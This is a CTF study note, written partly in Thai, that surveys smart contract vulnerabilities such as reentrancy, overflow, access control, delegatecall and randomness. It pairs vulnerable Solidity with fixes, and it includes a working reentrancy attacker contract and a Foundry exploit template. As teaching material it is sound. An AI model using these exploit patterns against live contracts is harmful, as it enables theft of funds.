---
tags: [ctf, blockchain, smart-contract, solidity, ethereum]
created: 2026-05-02
---

# 🔗 Smart Contract Security

> Blockchain CTF challenges เกือบทั้งหมดใช้ **Solidity** บน **Ethereum** (หรือ EVM-compatible chains): ผู้เล่นต้องหา exploit ใน contract → drain ETH หรือ trigger condition → flag

---

## 📚 Background

### Solidity / EVM
- Solidity = primary language for Ethereum smart contracts
- Compiles to **EVM bytecode**
- Bytecode runs on Ethereum Virtual Machine (deterministic, gas-metered)

### State
- Contract has **storage** (persistent on-chain)
- Contract has **balance** (ETH)
- User calls **functions** → state changes

### Test environments
- **Remix IDE** ⭐ remix.ethereum.org: browser-based
- **Foundry** ⭐: modern dev framework (forge, cast, anvil)
- **Hardhat**: JS-based dev framework
- **Ganache**: local blockchain
- Testnets: Sepolia, Goerli (deprecated), Holesky

### Tools
- **slither** ⭐: static analyzer (`pip install slither-analyzer`)
- **mythril**: symbolic execution
- **echidna**: fuzzer
- **foundry / forge**: testing + cast for tx
- **etherscan.io**: block explorer

---

## 🎯 Common Vulnerabilities

### 1. Reentrancy ⭐ (most famous)

#### Vulnerable code
```solidity
contract Bank {
    mapping(address => uint) public balances;
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw() external {
        uint amount = balances[msg.sender];
        require(amount > 0);
        
        // VULNERABILITY: external call before state update
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok);
        
        balances[msg.sender] = 0;   // ← updated AFTER call
    }
}
```

#### Why broken
- `withdraw()` sends ETH to `msg.sender` via `call`
- ถ้า `msg.sender` = attacker contract: มี `receive()` function
- `receive()` calls `withdraw()` again BEFORE balance set to 0
- Recursive draining!

#### Exploit
```solidity
contract Attacker {
    Bank bank;
    
    constructor(address _bank) payable {
        bank = Bank(_bank);
    }
    
    function attack() external payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }
    
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }
}
```

#### Fix
- **Checks-Effects-Interactions** pattern: update state BEFORE external call
- Use **ReentrancyGuard** (OpenZeppelin)

```solidity
function withdraw() external {
    uint amount = balances[msg.sender];
    balances[msg.sender] = 0;        // ← update FIRST
    (bool ok, ) = msg.sender.call{value: amount}("");
    require(ok);
}
```

#### Real attacks
- **The DAO Hack** (2016): $60M drained → Ethereum hard fork
- Cross-function reentrancy
- Read-only reentrancy (newer concept)

### 2. Integer Overflow / Underflow

ก่อน Solidity 0.8: overflow silent
```solidity
uint8 x = 255;
x = x + 1;       // wraps to 0 in pre-0.8
```

#### Exploit
```solidity
balances[msg.sender] -= amount;     // if amount > balance → underflow → huge number
```

→ Solidity 0.8+ has overflow check by default. ใน CTF: ถ้า contract uses old Solidity OR `unchecked { }` block → vulnerable

### 3. Access Control Issues

#### Missing modifier
```solidity
function setOwner(address _owner) external {
    owner = _owner;       // anyone can call!
}
```

→ Should have `onlyOwner` modifier

#### Public initialize function
```solidity
contract Vault {
    address owner;
    bool initialized;
    
    function initialize() external {
        require(!initialized);
        owner = msg.sender;
        initialized = true;
    }
}
```

→ ถ้า deploy แต่ลืม call initialize → attacker call first → become owner

#### tx.origin vs msg.sender
```solidity
require(tx.origin == owner);     // VULNERABLE
```

`tx.origin` = original transaction sender (EOA)
`msg.sender` = direct caller (could be contract)

ถ้า user (owner) interacts with malicious contract → that contract can call vulnerable function as if owner

→ Use `msg.sender` for access control

### 4. Predictable Randomness

```solidity
function lottery() external {
    uint random = uint(keccak256(abi.encodePacked(block.timestamp, msg.sender)));
    if (random % 100 == 7) {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

`block.timestamp` predictable: attacker computes ahead, calls when they win

→ Use Chainlink VRF for true randomness

### 5. Front-running

Mempool public → attacker sees pending tx → submit own with higher gas → executes first

#### Common variants
- **Reorder**: your tx executes after attacker's
- **Sandwich**: attacker before AND after your tx (DEX trades)
- **Insertion**: attacker copies your tx with higher gas

#### Mitigation
- Commit-reveal scheme
- Use private mempool (Flashbots)

### 6. Delegate Call Vulnerability

`delegatecall` runs target's code in caller's context (storage)
- Slot collisions → overwrite storage of caller
- If caller's first slot = `owner`, target's first slot operation overwrites owner

#### Exploit pattern (CTF favorite)
```solidity
contract Vulnerable {
    address public owner;
    Lib lib;
    
    function callLib(bytes memory data) external {
        (bool ok, ) = address(lib).delegatecall(data);     // VULNERABLE
    }
}

contract Lib {
    address public someAddr;       // slot 0
    
    function pwn() external {
        someAddr = msg.sender;      // overwrites Vulnerable.owner!
    }
}
```

### 7. Uninitialized Storage Pointer

```solidity
struct User { string name; }

function unsafe() external {
    User u;            // storage pointer points to slot 0!
    u.name = "x";       // overwrites slot 0 (might be owner)
}
```

(Old Solidity: fixed in 0.5+)

### 8. Self-destruct

```solidity
function destroy() external {
    selfdestruct(payable(msg.sender));    // sends all ETH, removes contract
}
```

→ ถ้าไม่มี access control → anyone destroys

→ **Note**: `selfdestruct` deprecated since EIP-6780 (Cancun upgrade): current behavior limited

### 9. Force-feeding ETH

ปกติ `receive()` / `fallback()` กำหนด how contract accepts ETH
- แต่ `selfdestruct(target)` sends ETH โดยไม่ trigger functions
- Contract thinks balance always = 0 (only counts deposits) → discrepancy

→ Don't rely on `address(this).balance` for invariants

### 10. Signature Replay

ใช้ signed message → replay to other chain / other contract / multiple times
- Should include `nonce` + `chainId` + `contract address` ใน message
- Otherwise, signature reusable

### 11. Flash Loan Attacks (real-world)

Borrow huge amount in 1 tx → manipulate price oracle → arbitrage → repay → profit
- Requires: cheap loan + manipulable oracle
- ตัวอย่าง: bZx, Harvest, PancakeBunny attacks

---

## 🛠 Tooling Workflow

### Read deployed contract
```bash
# Verify address on Etherscan
# Read source if verified

# Cast (Foundry)
cast etherscan-source 0x... --etherscan-api-key XYZ -d output/

# Or download via API
curl "https://api.etherscan.io/api?module=contract&action=getsourcecode&address=0x...&apikey=XYZ"
```

### Decompile bytecode (if not verified)
- **Panoramix**: panoramix.com (deprecated)
- **dedaub.com**: best web decompiler
- **Heimdall**: heimdall-rs

### Static analysis
```bash
slither contract.sol                       # all detectors
slither-check-erc 0x... mainnet            # ERC standard compliance
```

### Symbolic execution
```bash
mythril analyze contract.sol
```

### Fuzzing
```bash
echidna-test contract.sol
```

### Foundry: write exploit + run
```bash
forge init exploit
cd exploit
# Edit src/Exploit.sol
forge test                                  # run tests
forge test -vvvv                            # verbose

# Fork mainnet
forge test --fork-url $RPC_URL
```

---

## 🎯 CTF Workflow

### 1. Read the contract
- Identify functions: state-changing vs view
- Note `public` vs `external` vs `internal`
- Look for modifiers, access control
- Check Solidity version (>= 0.8 = overflow protected)

### 2. Identify "Win" condition
- Function `isSolved()` returns bool?
- `flag` variable that becomes accessible?
- `selfdestruct` to your address?
- Send entire balance?

### 3. Trace state changes needed
- What variables need specific values?
- What's the entry point?

### 4. Look for vulns
- External calls without state update first
- Math without overflow check
- Access control gaps
- delegatecall with user data
- Predictable random
- Initialize function

### 5. Write exploit contract
- Use Foundry/Hardhat to deploy + interact

### 6. Submit
- Most CTF tracks: deploy your exploit on testnet → call function → contract checks state → flag emitted via event

---

## 🔧 Useful Solidity for Exploits

### receive() and fallback()
```solidity
contract Attacker {
    receive() external payable {
        // Called when contract receives ETH (no data)
    }
    
    fallback() external payable {
        // Called when no other function matches
    }
}
```

### Send ETH
```solidity
// 1. transfer (2300 gas, throws on fail): old
payable(addr).transfer(1 ether);

// 2. send (2300 gas, returns bool): old
bool ok = payable(addr).send(1 ether);

// 3. call (forwards all gas, returns bool + data): modern
(bool ok, ) = addr.call{value: 1 ether}("");
require(ok);
```

### Calling functions
```solidity
// Direct
Target target = Target(addr);
target.someFunc();

// Low-level
(bool ok, bytes memory ret) = addr.call(abi.encodeWithSignature("foo(uint256)", 42));

// delegatecall (caller storage context)
(bool ok, ) = addr.delegatecall(abi.encodeWithSignature("foo()"));
```

---

## 🎓 Practice Platforms

- **Ethernaut** ⭐: ethernaut.openzeppelin.com (must do!)
- **Damn Vulnerable DeFi**: damnvulnerabledefi.xyz
- **CryptoZombies**: basic Solidity learning
- **Capture The Ether**: capturetheether.com
- **Paradigm CTF**: annually
- **HackTheBox blockchain section**

---

## 🎯 Common Exploit Template (Foundry)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ITarget {
    function vulnerable() external;
    function isSolved() external view returns (bool);
}

contract ExploitTest is Test {
    ITarget target;
    
    function setUp() public {
        target = ITarget(0x...);
    }
    
    function testExploit() public {
        // Run exploit
        target.vulnerable();
        
        // Check
        assertTrue(target.isSolved());
    }
}
```

```bash
forge test --fork-url <RPC> -vvvv
```

---

## 🔗 ที่เกี่ยวข้อง

- [Blockchain-Forensics](Blockchain-Forensics.md)
- [Race conditions concept](../03-Web-Exploitation/Race-Conditions.md)

## 📚 References

- "Mastering Ethereum": Andreas Antonopoulos
- consensys.github.io/smart-contract-best-practices
- swcregistry.io: SWC (Smart Contract Weakness) classification
- secureum.xyz: security course
- rekt.news: DeFi exploit writeups

---

#ctf #blockchain #smart-contract #solidity
